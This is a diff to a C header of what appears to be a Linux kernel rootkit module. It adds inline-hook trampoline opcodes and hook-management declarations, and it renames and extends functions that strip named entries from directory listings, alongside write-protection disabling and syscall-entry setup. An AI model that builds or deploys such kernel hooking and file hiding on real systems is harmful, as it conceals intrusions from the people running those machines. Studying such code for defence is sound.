@@ -33,6 +33,8 @@
 # include <linux/seq_file.h>
 // printk.
 # include <linux/printk.h>
+// struct linux_dirent64.
+# include <linux/dirent.h>
 # endif // CPP
 
 # include "structs.h"
@@ -58,6 +60,42 @@ set_lstar_sct(u32 address);
 void *
 phys_to_virt_kern(phys_addr_t address);
 
+
+// Functions related to inline hooking.
+
+# if defined(__x86_64__)
+#   define BYTES "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\xff\xe0"
+#   define DELTA 2
+# elif defined(__i386__)
+#   define BYTES "\x68\x44\x33\x22\x11\xc3"
+#   define DELTA 1
+# else
+#   error "Unsupported Architecture!"
+# endif
+
+# define HOOKED_SIZE (sizeof(BYTES) - 1)
+
+struct hooked_item {
+    void *real_addr;
+    unsigned char real_opcode[HOOKED_SIZE];
+    unsigned char fake_opcode[HOOKED_SIZE];
+    struct list_head list;
+};
+
+
+void
+install_inline_hook(void *real_addr, void *fake_addr);
+
+void
+pause_inline_hook(void *real_addr);
+
+void
+resume_inline_hook(void *real_addr);
+
+void
+remove_inline_hook(void *real_addr);
+
+
 // Functions related to write protection.
 
 void
@@ -65,6 +103,7 @@ disable_wp(void);
 
 void
 enable_wp(void);
+
 
 // Helper functions that print some information.
 
@@ -74,16 +113,21 @@ print_process_list(void);
 void
 print_module_list(void);
 
+
 // Functions that process linux_dirent.
 
-// TODO: Consider the name ``print_dents``?
 void
-print_dirent(struct linux_dirent *dirp, long total);
+print_dents(struct linux_dirent *dirp, long total);
 
-// TODO: Consider the name ``remove_dirent`` or ``remove_dent``?
+void
+print_dents64(struct linux_dirent64 *dirp, long total);
+
 long
-remove_dirent_entry(char *name,
-                    struct linux_dirent *dirp, long total);
+remove_dent(char *name, struct linux_dirent *dirp, long total);
+
+long
+remove_dent64(char *name, struct linux_dirent64 *dirp, long total);
+
 
 // Miscellaneous helper functions.
 
